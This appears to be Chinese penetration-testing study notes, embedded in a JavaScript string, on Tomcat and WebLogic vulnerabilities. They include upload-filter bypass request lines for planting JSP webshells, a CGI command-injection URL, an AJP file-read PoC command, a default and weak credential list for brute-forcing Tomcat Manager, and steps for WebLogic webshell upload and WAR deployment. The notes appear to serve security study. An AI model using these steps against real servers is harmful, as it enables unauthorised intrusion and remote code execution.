      Tomcat \u5B89\u5168\u6F0F\u6D1E \uFF08CVE-2017-5648\uFF09
      Tomcat Default Servlet \u5B89\u5168\u6F0F\u6D1E \uFF08CVE-2017-5664\uFF09
      Tomcat \u5B89\u5168\u6F0F\u6D1E \uFF08CVE-2017-6056\uFF09



      Tomcat \u4EFB\u610F\u6587\u4EF6\u5199\u5165 \uFF08PUT\u8BF7\u6C42\uFF09\uFF08CVE-2017-12615\uFF09
              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A

              \u5229\u7528\u6761\u4EF6

              \u6F0F\u6D1E\u6982\u8FF0

              \u539F\u7406\u5206\u6790
                      1\u3001\u7531\u4E8E\u914D\u7F6E\u4E0D\u5F53\uFF08\u975E\u9ED8\u8BA4\u914D\u7F6E\uFF09\uFF0C\u5C06\u914D\u7F6E\u6587\u4EF6conf/web.xml\u4E2D\u7684readonly\u8BBE\u7F6E\u4E3A\u4E86 false\uFF0C\u5BFC\u81F4\u53EF\u4EE5\u4F7F\u7528PUT\u65B9\u6CD5\u4E0A\u4F20\u4EFB\u610F\u6587\u4EF6\uFF0C\u4F46\u9650\u5236\u4E86jsp\u540E\u7F00\u7684\u4E0A\u4F20\u3002
                              1\u3001\u6839\u636E\u63CF\u8FF0\uFF0C\u5728 Windows \u670D\u52A1\u5668\u4E0B\uFF0C\u5C06 readonly \u53C2\u6570\u8BBE\u7F6E\u4E3A false \u65F6\uFF0C\u5373\u53EF\u901A\u8FC7 PUT \u65B9\u5F0F\u521B\u5EFA\u4E00\u4E2A JSP \u6587\u4EF6\uFF0C\u5E76\u53EF\u4EE5\u6267\u884C\u4EFB\u610F\u4EE3\u7801
                              2\u3001\u901A\u8FC7\u9605\u8BFB conf/web.xml \u6587\u4EF6\uFF0C\u53EF\u4EE5\u53D1\u73B0\uFF0C\u9ED8\u8BA4 readonly \u4E3A true\uFF1B
                                      \u5F53 readonly \u8BBE\u7F6E\u4E3A false \u65F6\uFF0C\u53EF\u4EE5\u901A\u8FC7 PUT / DELETE \u8FDB\u884C\u6587\u4EF6\u64CD\u63A7

              \u6F0F\u6D1E\u5229\u7528
                      1\u3001\u4F7F\u7528 \u300APUT <Tomcat\u670D\u52A1\u5668\u6839\u8DEF\u5F84>/<\u4EFB\u610F\u6587\u4EF6\u540D>.txt HTTP/1.1\u300B \uFF0C\u5185\u5BB9\u586B \u300A  \u4EFB\u610F\u5B57\u7B26\u5982testpoc \u300B \uFF0C\u5373\u53EF\u4E0A\u4F20\u6210\u529F\u3002
                      2\u3001\u4E00\u822C\u60C5\u51B5\u4E0B\uFF0C\u9650\u5236\u4E86jsp\u540E\u7F00\u7684\u4E0A\u4F20\u3002\u6211\u4EEC\u9700\u8981\u8FDB\u884C\u7ED5\u8FC7\uFF1A
                              1\u3001\u4F7F\u7528PUT\u65B9\u6CD5\u76F4\u63A5\u4E0A\u4F20\u4E00\u4E2A\u51B0\u874E\u7684jsp\u4E0A\u53BB\uFF0C\u53D1\u73B0\u8FD4\u56DE\u7684\u662F404\uFF0C\u5E94\u8BE5\u662F\u88AB\u62E6\u622A\u4E86
                              2\u3001\u8FD9\u91CC\u7ED5\u8FC7\u6709\u4E09\u79CD\u65B9\u6CD5\uFF1A
                                      1\u3001Windows\u4E0B\u4E0D\u5141\u8BB8\u6587\u4EF6\u4EE5\u7A7A\u683C\u7ED3\u5C3E\uFF08\u4F1A\u81EA\u52A8\u62B9\u53BB\u7A7A\u683C\uFF09\uFF0C\u4EE5\uFF1A
                                              PUT /a001.jsp%20 HTTP/1.1
                                                      1\u3001\u4E0A\u4F20\u5230 Windows\u4F1A\u88AB\u81EA\u52A8\u53BB\u6389\u672B\u5C3E\u7A7A\u683C
                                      2\u3001Windows NTFS\u6D41
                                              Put /a001.jsp::$DATA HTTP/1.1
                                                      1\u3001\u5728 jsp \u540E\u9762\uFF0C\u6DFB\u52A0 \u300A::$DATA\u300B\uFF0C\u5373\u53EF\u6210\u529F\u3002
                                      3\u3001  \u300A/\u300B \u5728\u6587\u4EF6\u540D\u4E2D\u662F\u975E\u6CD5\u7684\uFF0C\u4E5F\u4F1A\u88AB\u53BB\u9664\uFF08Linux/Windows\uFF09
                                              PuT /a001.jsp/ http/1.1
                      3\u3001\u5728 jsp \u6210\u529F\u4E0A\u4F20\u540E\uFF0C\u6211\u4EEC\u7528\u5DE5\u5177\uFF0C\u8FDE\u4E0A\u5373\u53EF\u62FF\u5230 WebShell \u3002


      Tomcat \u4FE1\u606F\u6CC4\u9732\u6F0F\u6D1E  \uFF08CVE-2017-12616\uFF09
      Tomcat \u5B89\u5168\u6F0F\u6D1E     \uFF08CVE-2017-12617\uFF09
      Tomcat \u5B89\u5168\u6F0F\u6D1E     \uFF08CVE-2018-1304\uFF09
      Tomcat \u5B89\u5168\u6F0F\u6D1E     \uFF08CVE-2018-1305\uFF09


      Tomcat \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C \uFF08CVE-2019-0232\uFF09
              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A

              \u5229\u7528\u6761\u4EF6

              \u6F0F\u6D1E\u6982\u8FF0

              \u539F\u7406\u5206\u6790
                      1\u3001\u6F0F\u6D1E\u76F8\u5173\u7684\u4EE3\u7801\u5728 tomcat\\java\\org\\apache\\catalina\\servlets\\CGIServlet.java \u4E2D\uFF0C
                              1\u3001CGIServlet\u63D0\u4F9B\u4E86\u4E00\u4E2Acgi\u7684\u8C03\u7528\u63A5\u53E3\uFF0C
                                      1\u3001\u5728\u542F\u7528 enableCmdLineArguments \u53C2\u6570\u65F6\uFF0C\u4F1A\u6839\u636ERFC 3875\u6765\u4ECEUrl\u53C2\u6570\u4E2D\u751F\u6210\u547D\u4EE4\u884C\u53C2\u6570\uFF0C
                                      2\u3001\u5E76\u628A\u53C2\u6570\u4F20\u9012\u81F3Java\u7684 Runtime \u6267\u884C\u3002
                      2\u3001\u8FD9\u4E2A\u6F0F\u6D1E\u662F\u56E0\u4E3A Runtime.getRuntime().exec \u5728Windows\u4E2D\u548CLinux\u4E2D\u5E95\u5C42\u5B9E\u73B0\u4E0D\u540C\u5BFC\u81F4\u7684
                              1\u3001Java\u7684 Runtime.getRuntime().exec \u5728CGI\u8C03\u7528\u8FD9\u79CD\u60C5\u51B5\u4E0B\u5F88\u96BE\u6709\u547D\u4EE4\u6CE8\u5165\u3002
                                      1\u3001\u800CWindows\u4E2D\u521B\u5EFA\u8FDB\u7A0B\u4F7F\u7528\u7684\u662F CreateProcess \uFF0C\u4F1A\u5C06\u53C2\u6570\u5408\u5E76\u6210\u5B57\u7B26\u4E32\uFF0C\u4F5C\u4E3A lpComandLine \u4F20\u5165 CreateProcess \u3002
                                              1\u3001\u7A0B\u5E8F\u542F\u52A8\u540E\u8C03\u7528 GetCommandLine \u83B7\u53D6\u53C2\u6570\uFF0C\u5E76\u8C03\u7528 CommandLineToArgvW \u4F20\u81F3 argv\u3002
                                      2\u3001\u5728Windows\u4E2D\uFF0C\u5F53 CreateProcess \u4E2D\u7684\u53C2\u6570\u4E3A bat \u6587\u4EF6\u6216\u662F cmd \u6587\u4EF6\u65F6\uFF0C\u4F1A\u8C03\u7528 cmd.exe , \u6545\u6700\u540E\u4F1A\u53D8\u6210 cmd.exe /c "arg.bat & dir"\uFF0C
                                              1\u3001\u800CJava\u7684\u8C03\u7528\u8FC7\u7A0B\u5E76\u6CA1\u6709\u505A\u4EFB\u4F55\u7684\u8F6C\u4E49\uFF0C\u6240\u4EE5\u5728Windows\u4E0B\u4F1A\u5B58\u5728\u6F0F\u6D1E

              \u6F0F\u6D1E\u5229\u7528
                      1\u3001\u590D\u73B0\u7684\u73AF\u5883\u51C6\u5907\uFF08\u672C\u5730\u73AF\u5883\uFF09\uFF1A
                              1\u3001Tomcat\u7684 CGI_Servlet \u7EC4\u4EF6\u9ED8\u8BA4\u662F\u5173\u95ED\u7684\uFF0C\u5728 conf/web.xml \u4E2D\u627E\u5230\u6CE8\u91CA\u7684 CGIServlet \u90E8\u5206\uFF0C\u53BB\u6389\u6CE8\u91CA\uFF0C\u5E76\u914D\u7F6EenableCmdLineArguments\u548Cexecutable \u3002
                              2\u3001\u7136\u540E\u5728 conf/web.xml \u4E2D\u542F\u7528cgi\u7684 servlet-mapping
                              3\u3001\u4FEE\u6539 conf/context.xml \u7684\u6DFB\u52A0 privileged="true"\u5C5E\u6027\uFF0C\u5426\u5219\u4F1A\u6CA1\u6709\u6743\u9650
                              4\u3001\u5728C:\\Tomcat\\webapps\\ROOT\\WEB-INF\u4E0B\u521B\u5EFAcgi-bin\u76EE\u5F55
                                      1\u3001\u5728\u8BE5\u76EE\u5F55\u4E0B\u521B\u5EFA\u4E00\u4E2Ahello.bat
                              5\u3001\u7136\u540E\u91CD\u542Ftomcat\u73AF\u5883
                      2\u3001\u73AF\u5883\u51C6\u5907\u597D\u540E\uFF0Cpayload\u5982\u4E0B\uFF1A
                              1\u3001 \u8BBF\u95EE http://localhost:8080/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5Ccalc.exe \u5373\u53EF\u5F39\u51FA\u8BA1\u7B97\u5668
                                      1\u3001\u5728\u8FD9\u91CC\uFF0C\u6539\u9020 \u5E76\u6784\u9020\u7CFB\u7EDF\u547D\u4EE4 \u5373\u53EF\u3002

      Tomcat AJP\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E \uFF08CVE-2020-1938\uFF09

              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A

              \u5229\u7528\u6761\u4EF6

              \u6F0F\u6D1E\u6982\u8FF0
                      1\u3001\u7531\u4E8E Tomcat AJP\u534F\u8BAE\u8BBE\u8BA1\u4E0A\u5B58\u5728\u7F3A\u9677\uFF0C\u653B\u51FB\u8005\u901A\u8FC7 Tomcat AJP Connector\u53EF\u4EE5\u8BFB\u53D6\u6216\u5305\u542B Tomcat\u4E0A\u6240\u6709 webapp\u76EE\u5F55\u4E0B\u7684\u4EFB\u610F\u6587\u4EF6\uFF0C\u4F8B\u5982\u53EF\u4EE5\u8BFB\u53D6 webapp\u914D\u7F6E\u6587\u4EF6\u6216\u6E90\u7801\u3002
                              1\u3001\u6B64\u5916\u5728\u76EE\u6807\u5E94\u7528\u6709\u6587\u4EF6\u4E0A\u4F20\u529F\u80FD\u7684\u60C5\u51B5\u4E0B\uFF0C\u914D\u5408\u6587\u4EF6\u5305\u542B\u7684\u5229\u7528\u8FD8\u53EF\u4EE5\u8FBE\u5230\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u7684\u5371\u5BB3\u3002
              \u539F\u7406\u5206\u6790
                      1\u3001Tomcat \u914D\u7F6E\u4E86\u4E24\u4E2A Connector\uFF0C\u5B83\u4EEC\u5206\u522B\u662F HTTP \u548C AJP \uFF1A
                              1\u3001HTTP\u9ED8\u8BA4\u7AEF\u53E3\u4E3A8080\uFF0C\u5904\u7406http\u8BF7\u6C42\uFF0C
                              2\u3001\u800CAJP\u9ED8\u8BA4\u7AEF\u53E38009\uFF0C\u7528\u4E8E\u5904\u7406 AJP \u534F\u8BAE\u7684\u8BF7\u6C42\uFF0C
                                      1\u3001\u800CAJP\u6BD4http\u66F4\u52A0\u4F18\u5316\uFF0C\u591A\u7528\u4E8E\u53CD\u5411\u3001\u96C6\u7FA4\u7B49\uFF0C
                                      2\u3001\u6F0F\u6D1E\u7531\u4E8ETomcat AJP\u534F\u8BAE\u5B58\u5728\u7F3A\u9677\u800C\u5BFC\u81F4\uFF0C
                                              1\u3001\u653B\u51FB\u8005\u5229\u7528\u8BE5\u6F0F\u6D1E\u53EF\u901A\u8FC7\u6784\u9020\u7279\u5B9A\u53C2\u6570\uFF0C\u8BFB\u53D6\u670D\u52A1\u5668webapp\u4E0B\u7684\u4EFB\u610F\u6587\u4EF6\u4EE5\u53CA\u53EF\u4EE5\u5305\u542B\u4EFB\u610F\u6587\u4EF6\uFF0C
                                              2\u3001\u5982\u679C\u6709\u67D0\u4E0A\u4F20\u70B9\uFF0C\u4E0A\u4F20\u56FE\u7247\u9A6C\u7B49\u7B49\uFF0C\u5373\u53EF\u4EE5\u83B7\u53D6shell
                      2\u3001tomcat\u9ED8\u8BA4\u7684conf/server.xml\u4E2D\u914D\u7F6E\u4E862\u4E2AConnector\uFF0C\u4E24\u4E2A\u7AEF\u53E3\u9ED8\u8BA4\u5747\u76D1\u542C\u5728\u5916\u7F51ip\u3002
                              1\u3001\u4E00\u4E2A\u4E3A8080\u7684\u5BF9\u5916\u63D0\u4F9B\u7684HTTP\u534F\u8BAE\u7AEF\u53E3\uFF0C
                              2\u3001\u53E6\u5916\u4E00\u4E2A\u5C31\u662F\u9ED8\u8BA4\u76848009 AJP\u534F\u8BAE\u7AEF\u53E3\uFF0C
                                      1\u3001tomcat\u5728\u63A5\u6536 AJP \u8BF7\u6C42\u7684\u65F6\u5019\u8C03\u7528 org.apache.coyote.ajp.AjpProcessor \u6765\u5904\u7406ajp\u6D88\u606F\uFF0C
                                              1\u3001prepareRequest\u5C06ajp\u91CC\u9762\u7684\u5185\u5BB9\u53D6\u51FA\u6765\u8BBE\u7F6E\u6210request\u5BF9\u8C61\u7684Attribute\u5C5E\u6027
                                              2\u3001\u56E0\u6B64\u53EF\u4EE5\u901A\u8FC7\u6B64\u79CD\u7279\u6027\u4ECE\u800C\u53EF\u4EE5\u63A7\u5236request\u5BF9\u8C61\u7684\u4E0B\u9762\u4E09\u4E2AAttribute\u5C5E\u6027
                                                      javax.servlet.include.request_uri
                                                      javax.servlet.include.path_info
                                                      javax.servlet.include.servlet_path
                                              3\u3001\u7136\u540E\u5C01\u88C5\u6210\u5BF9\u5E94\u7684request\u4E4B\u540E,\u7EE7\u7EED\u8D70servlet\u7684\u6620\u5C04\u6D41\u7A0B\u5982\u4E0B
                                                      getAdapter().service(request , response);

              \u6F0F\u6D1E\u5229\u7528
                      1\u3001\u4F7F\u7528PoC\u811A\u672C\uFF0C\u5982\u300A  CNVD-2020-10487-Tomcat-Ajp-lfi.py  \u300B\u3002
                              1.\u6BD4\u5982\uFF0C\u6211\u4EEC \u67E5\u770B8009\u7AEF\u53E3\u4E0B\u7684web.xml\u6587\u4EF6 \uFF1A
                                      python  CNVD-2020-10487-Tomcat-Ajp-lfi.py  192.168.1.8  -p  8009  -f  /WEB-INF/web.xml
                      2\u3001\u7136\u540E\uFF0C\u5982\u679C\u9700\u8981\u8FDE WebShell \u7684\u8BDD\uFF0C\u5C06\u76F8\u5E94\u8DEF\u5F84\uFF0C\u6539\u4E3A \u300A\u5DF2\u4E0A\u4F20\u7684\u6728\u9A6C\u5730\u5740\u300B \u5373\u53EF\u3002


      Tomcat manager App \u66B4\u529B\u7834\u89E3

              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A

              \u5229\u7528\u6761\u4EF6

              \u6F0F\u6D1E\u6982\u8FF0
                      1\u3001Manager APP \u662F\u4EC0\u4E48\uFF1A
                              1\u30011\u3001\u5728\u751F\u4EA7\u73AF\u5883\u4E2D\uFF0C\u4E3A\u4E86\u5B9E\u73B0\u90E8\u7F72\u65B0\u7684Web\u5E94\u7528\u7A0B\u5E8F\u6216\u53D6\u6D88\u90E8\u7F72\u73B0\u6709\u7684\u7A0B\u5E8F\u800C\u4E0D\u5FC5\u91CD\u542F\u5BB9\u5668\u3001\u52A8\u6001\u66F4\u65B0\u7A0B\u5E8F\u4EE3\u7801\u3001\u5217\u51FA\u4E00\u4E9BJVM\u6216\u64CD\u4F5C\u7CFB\u7EDF\u7684\u5C5E\u6027\u503C\u3001\u5217\u51FA\u5E94\u7528\u7A0B\u5E8F\u6216\u4F1A\u8BDD\u7B49\u7B49\u57FA\u7840\u529F\u80FD\uFF0C
                                      1\u3001Tomcat\u9ED8\u8BA4\u5305\u62EC\u4E86\u4E00\u4E2AWeb\u5E94\u7528\u7A0B\u5E8F\uFF0C\u901A\u5E38\u4F4D\u4E8E$CATALINA_BASE/webapps/manager\u76EE\u5F55\u4E0B\uFF1A
                                              1\u3001\u5E76\u4E14\u8FD9\u4E2A\u5E94\u7528\u7A0B\u5E8F\u9ED8\u8BA4\u7684 context path \u4E5F\u4E3A/manager\uFF0C\u8BBF\u95EE\u5E94\u7528\u7684\u65B9\u5F0F\u4E3A \u300A/manager/html\u300B\u3002

              \u539F\u7406\u5206\u6790
                      1\u3001\u540E\u53F0\u5BC6\u7801\u7528 base64 \u7F16\u7801\u4F20\u8F93\uFF0C\u6293\u5305\u89E3\u5BC6\u5373\u53EF\u5F97\u5230\u540E\u53F0\u5BC6\u7801\uFF0C\u4E5F\u53EF\u4EE5\u8FDB\u884C\u7206\u7834\u3002


              \u6F0F\u6D1E\u5229\u7528
                      1\u3001\u6F0F\u6D1E\u590D\u73B0\u8FC7\u7A0B\uFF1A
                              1\u3001\u7B2C\u4E00\u79CD \u653B\u51FB\u65B9\u5F0F\uFF0C\u6293\u5305\u89E3\u5BC6\uFF1A
                                      1\u3001\u8FD9\u91CC\u8BBF\u95EE http://localhost:8000/manager/html \u8FDB\u884C\u6293\u5305\uFF0C\u5728\u6CA1\u6709\u8F93\u5165\u5E10\u53F7\u5BC6\u7801\u7684\u65F6\u5019\u662F\u6CA1\u6709\u4EC0\u4E48\u6570\u636E\u7684\u3002
                                              1\u3001\u4F1A\u8BF7\u6C42\u8F93\u5165\u7528\u6237\u540D\u548C\u5BC6\u7801\uFF0C\u518D\u8FDB\u884C\u6293\u5305
                                                      1\u3001\u5C31\u53EF\u4EE5\u5F97\u5230Authorization\u8FD9\u4E2A\u5B57\u6BB5\uFF0C\u8FD9\u4E2A\u5B57\u6BB5\u6709\u4E00\u4E2ABasic\uFF0C\u5C31\u662Fbase64\u52A0\u5BC6\u7684\u610F\u601D
                                                              \u6BD4\u5982\uFF1A
                                                                      Authorization:Basic dG9tY2F0OnRvbWNhdA==
                                                      2\u3001\u8FD9\u91CC\u76F4\u63A5\u653E\u5230 base64 \u89E3\u5BC6\uFF0C\u5F97\u5230 tomcat:tomcat \u7684\u5BC6\u7801
                              2\u3001\u7B2C\u4E8C\u79CD \u653B\u51FB\u65B9\u5F0F\uFF0C\u8FDB\u884C\u7206\u7834\uFF1A
                                      1\u3001\u8FDB\u5165\u540E\u53F0\u4E4B\u540E\u518D\u6B21\u6293\u5305\u53EF\u4EE5\u770B\u5230\u6709\u4E00\u4E2Acookie\uFF0C\u4F46\u662F\u6CA1\u6709\u4E86Authorization\u8FD9\u4E2A\u5B57\u6BB5
                                              1\u3001\u6211\u4EEC\uFF0C\u53EF\u4EE5\u5728\u8BF7\u6C42\u7684 Header \u91CC\u9762\uFF0C\u589E\u52A0\u300AAuthorization\u300B\u5B57\u6BB5\uFF0C\u7136\u540E\u8FDB\u884C\u7206\u7834\uFF1A
                                                      1\u3001\u4E00\u4E9B\u5E38\u89C1\u7684 \u300A\u82E5\u8D26\u6237+\u5F31\u53E3\u4EE4\u300B \u7EC4\u5408\uFF1A
                                                              // \u5B98\u65B9Demo\u91CC\uFF0C\u88AB\u6CE8\u91CA\uFF0C\u4F46\u6709\u7684\u7BA1\u7406\u5458\u4F1A\u4E0D\u4FEE\u6539  \u76F4\u63A5\u89E3\u5F00\u6CE8\u91CA\u7684\u3002
                                                              tomcat:tomcat
                                                              both:tomcat
                                                              role1:tomcat

                                                              // \u5176\u5B83\u4E60\u60EF\u7528\u7684
                                                              admin:admin
                                                              admin:123456
                                                              root:root
                                                              manager:manager:
                                                              admin:admin888
                                                      2\u3001\u6211\u4EEC\u624B\u52A8\uFF0C\u5C06 base64 \u7F16\u7801\u540E\u7684\u503C\u653E\u5165\u3002
                                                      3\u3001\u5982\u679C\u7206\u7834\u6210\u529F\uFF0C\u5219\u6211\u4EEC\u53EF\u4EE5\u62FF\u5230 \u8D26\u53F7/\u5BC6\u7801 \u3002


      `),Object(u.c)("WebLogic",`

      \u8D44\u6599\uFF1A

              \u539F\u672C\u53C2\u8003\u8D44\u6599\uFF1A
                      \u53BB\u54EA\u513F\u4E86\uFF1F  \u6211\u5FD8\u4E86\uFF1F\uFF1F\uFF1F

              \u8FD8\u6CA1\u6709\u8BFB\u5B8C\u7684\uFF1A
                      https://cloud.tencent.com/developer/article/1516342?from=10680

      XMLDecoder \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\uFF08CVE-2017-3506 & CVE-2017-10271\uFF09
          \u5F71\u54CD\u7248\u672C\uFF1AWeblogic < 10.3.6

          \u6F0F\u6D1E\u6210\u56E0\uFF1A
              Weblogic\u7684WLS Security\u7EC4\u4EF6\u5BF9\u5916\u63D0\u4F9Bwebservice\u670D\u52A1\uFF0C\u5176\u4E2D\u4F7F\u7528\u4E86XMLDecoder\u6765\u89E3\u6790\u7528\u6237\u4F20\u5165\u7684XML\u6570\u636E\uFF0C\u5728\u89E3\u6790\u7684\u8FC7\u7A0B\u4E2D\u51FA\u73B0\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\uFF0C\u5BFC\u81F4\u53EF\u6267\u884C\u4EFB\u610F\u547D\u4EE4\u3002

          \u5229\u7528\u65B9\u5F0F\uFF1A
              \u53EA\u8981\u662F\u5728wls-wsat\u5305\u4E2D\u7684Uri\u7686\u53D7\u5230\u5F71\u54CD\uFF0C\u53EF\u4EE5\u67E5\u770Bweb.xml\u5F97\u77E5\u6240\u6709\u53D7\u5230\u5F71\u54CD\u7684Uri
              \u6293\u5305POST\u5199\u5165\u6570\u636E\uFF0C\u5176\u4E2DContent-Type\u9700\u8981\u7B49\u4E8Etext/xml,\u5426\u5219\u53EF\u80FD\u5BFC\u81F4XMLDecoder\u4E0D\u89E3\u6790\u3002
                  \u8FD9\u53E5\u8BDD\u4F1A\u5199\u5165\u4E00\u4E2Atest.jsp\u8BBF\u95EE\u4F1A\u6253\u5370\u3002

      Weblogic wls9_async_response,wls-wsat \u53CD\u5E8F\u5217\u5316\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08CVE-2019-2725\uFF09
          \u5F71\u54CD\u7EC4\u4EF6\uFF1Abea_wls9_async_response.war, wls-wsat.war
          \u5F71\u54CD\u7248\u672C\uFF1A10.3.6.0, 12.1.3.0

          \u5229\u7528\u65B9\u5F0F\uFF1A
              \u6F0F\u6D1E\u4E0D\u4EC5\u5B58\u5728\u4E8E /_async/AsyncResponseService \u53EA\u8981\u662F\u5728bea_wls9_async_response\u5305\u4E2D\u7684Uri\u7686\u53D7\u5230\u5F71\u54CD\uFF0C\u53EF\u4EE5\u67E5\u770Bweb.xml\u5F97\u77E5\u6240\u6709\u53D7\u5230\u5F71\u54CD\u7684Uri\u3002
              \u4F20\u5165xml\u5F62\u5F0F\u7684payload \uFF08\u7565\uFF09

      Weblogic WLS Core Components \u53CD\u5E8F\u5217\u5316\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E
          \u5229\u7528\u65B9\u5F0F\uFF1A
              \u4F7F\u7528ysoserial.jar\uFF0C\u542F\u52A8JRMP Server \uFF0C\u521B\u5EFA\u4E86\u4E00\u4E2A \u6587\u4EF6\u5939\uFF0CJRMP Server\u76D1\u542C\u7684\u7AEF\u53E3\u4E3A9999
              \u7136\u540E\uFF0C\u4F7F\u7528exploit.py\u811A\u672C\uFF0C\u5411\u76EE\u6807Weblogic\uFF08http://your-ip:7001\uFF09\u53D1\u9001\u6570\u636E\u5305\uFF1A
                  \uFF08\u53EF\u7701\u7565\uFF09
                      \u5176\u4E2D\uFF0C[victim ip]\u548C[victim port]\u662F\u76EE\u6807weblogic\u7684IP\u548C\u7AEF\u53E3\uFF0C[path to ysoserial]\u662F\u672C\u5730ysoserial\u7684\u8DEF\u5F84\uFF0C
                      [JRMPListener ip]\u548C[JRMPListener port]\u7B2C\u4E00\u6B65\u4E2D\u542F\u52A8JRMP Server\u7684IP\u5730\u5740\u548C\u7AEF\u53E3\u3002
                      [JRMPClient]\u662F\u6267\u884CJRMPClient\u7684\u7C7B\uFF0C\u53EF\u9009\u7684\u503C\u662FJRMPClient\u6216JRMPClient2\u3002

      Weblogic \u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\uFF08CVE-2018-2894\uFF09
          \u5F71\u54CD\u7248\u672C\uFF1A12.1.3.0, 12.2.1.2, 12.2.1.3
          \u6F0F\u6D1E\u6210\u56E0\uFF1AWeblogic Web Service Test Page\u4E2D\u4E00\u5904\u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\uFF0CWeb Service Test Page \u5728"\u751F\u4EA7\u6A21\u5F0F"\u4E0B\u9ED8\u8BA4\u4E0D\u5F00\u542F\uFF0C\u6240\u4EE5\u8BE5\u6F0F\u6D1E\u6709\u4E00\u5B9A\u9650\u5236\u3002

          \u5229\u7528\u65B9\u5F0F\uFF1A
              \u7B2C\u4E00\u6B21\u4E0A\u4F20\u70B9\uFF1A\u8BBF\u95EE http://127.0.0.1:7001/ws_utc/config.do
                  \u8BBE\u7F6EWork Home Dir\u4E3Aws_utc\u5E94\u7528\u7684\u9759\u6001\u6587\u4EF6css\u76EE\u5F55
                  \u63D0\u4EA4\u540E\uFF0C\u70B9\u51FB\u5DE6\u4FA7 \u5B89\u5168-> \u6DFB\u52A0\uFF0C\u7136\u540E\u4E0A\u4F20Webshell\u3002
                  \u70B9\u51FB\u63D0\u4EA4submit\uFF0C\u6293\u53D6\u4E0A\u4F20\u7684\u8FD4\u56DE\u5305\uFF0C\u53EF\u4EE5\u770B\u5230\u6709\u4E00\u4E32\u6570\u5B57\uFF0C\u662F\u65F6\u95F4\u6233
                  \u7136\u540E\u8BBF\u95EE http://127.0.0.1:7001/ws_utc/css/config/keystore/[\u65F6\u95F4\u6233]_[\u6587\u4EF6\u540D]\uFF0C\u5373\u53EF\u6267\u884Cwebshell

              \u7B2C\u4E8C\u5904\u4E0A\u4F20\u70B9\uFF1Ahttp://127.0.0.1:7001/ws_utc/begin.do
                  \u70B9\u51FB\u53F3\u4E0A\u89D2\u7684\u6587\u4EF6\u5939\uFF0C\u4E0A\u4F20Webshell\uFF0C\u70B9\u51FB\u63D0\u4EA4\uFF0C\u5E76\u6293\u53D6\u8FD4\u56DE\u5305
                  \u53EF\u4EE5\u770B\u5230\u8FD4\u56DE\u7684\u8DEF\u5F84\uFF0C\u76F4\u63A5\u8BBF\u95EEhttp://127.0.0.1:7001/ws_utc/css/upload/RS_Upload_2022-03-03_14-18-52_934/import_file_name_shell.jsp

      Weblogic SSRF\u6F0F\u6D1E \uFF08CVE-2014-4210\uFF09
          \u5F71\u54CD\u7248\u672C\uFF1A10.0.2.0, 10.3.6.0

          \u5229\u7528\u65B9\u5F0F\uFF1A
              \u901A\u8FC7\u8FD4\u56DE\u6570\u636E\u5305\u4E2D\u7684\u9519\u8BEF\u4FE1\u606F\uFF0C\u5373\u53EF\u63A2\u6D4B\u5185\u7F51\u72B6\u6001\u3002
                  \u8BBF\u95EE /uddiexplorer/SearchPublicRegistries.jsp\uFF0C\u82E5\u80FD\u6B63\u5E38\u8BBF\u95EE\uFF0C\u5219\u53EF\u80FD\u5B58\u5728\u6B64\u6F0F\u6D1E\uFF0C\u586B\u5199\u4EFB\u610F\u4FE1\u606F\uFF0C\u5982\u4E0B
              \u901A\u8FC7\u8FD4\u56DE\u6570\u636E\u5305\u4E2D\u7684\u9519\u8BEF\u4FE1\u606F\uFF0C\u5373\u53EF\u63A2\u6D4B\u5185\u7F51\u72B6\u6001\u3002\u5B9E\u6218\u4E2D\u53EF\u4EE5\u901A\u8FC7\u7206\u7834\uFF0C\u4ECE\u8FD4\u56DE\u6570\u636E\u5305\u7684\u957F\u5EA6\u6765\u5224\u65AD\u5F00\u653E\u4E86\u54EA\u4E9B\u7AEF\u53E3\uFF0C\u518D\u6839\u636E\u5F00\u653E\u7684\u7AEF\u53E3\u6DF1\u5165\u5229\u7528\u3002

      Weblogic \u5F31\u53E3\u4EE4 && \u540E\u53F0getshell
          \u5229\u7528\u65B9\u5F0F\uFF1A
              \u8BBF\u95EEhttp://127.0.0.1:7001/console \u81EA\u52A8\u91CD\u5B9A\u5411\u5230http://127.0.0.1:7001/console/login/LoginForm.jsp\uFF0C\u4F7F\u7528\u5F31\u53E3\u4EE4\u767B\u9646\u540E\u53F0\u3002
              \u8FDB\u5165\u540E\u53F0\u540E\uFF0C\u70B9\u51FB\u90E8\u7F72\uFF0C\u8FDB\u4E00\u6B65\u70B9\u51FB\u53F3\u8FB9\u7684\u5B89\u88C5\u3002
                  \u9009\u62E9\u4E0A\u4F20\u6587\u4EF6
                  \u4E0A\u4F20war\u5305
                  \u4E0A\u4F20\u5B8C\u6210\u4EE5\u540E\u9009\u4E2D\u4F60\u4E0A\u4F20\u7684\u6587\u4EF6,\u70B9\u51FB\u4E0B\u4E00\u6B65
                  \u518D\u4E0B\u4E00\u6B65\u540E\u76F4\u63A5\u70B9\u51FB\u5B8C\u6210\u5373\u53EF
                  \u53EF\u4EE5\u770B\u5230\u5DF2\u7ECF\u90E8\u7F72
                  \u8BBF\u95EE\uFF1Ahttp://ip:port/[war\u5305\u540D]/[\u5305\u540D\u5185\u6587\u4EF6\u540D]\u5373\u53EF

      WebLogic\u8FDC\u7A0B\u90E8\u7F72\u6F0F\u6D1E
          \u6F0F\u6D1E\u63CF\u8FF0
              weblogic\u662F\u4E00\u4E2A\u57FA\u4E8EJavaEE\u6784\u67B6\u7684\u4E2D\u95F4\u4EF6\uFF0C\u5B89\u88C5\u5B8Cweblogic\u9ED8\u8BA4\u4F1A\u76D1\u542C7001\u7AEF\u53E3\uFF0C\u53EF\u4EE5\u8FDC\u7A0B\u90E8\u7F72\u7F51\u7AD9\u4EE3\u7801

          \u6F0F\u6D1E\u9A8C\u8BC1
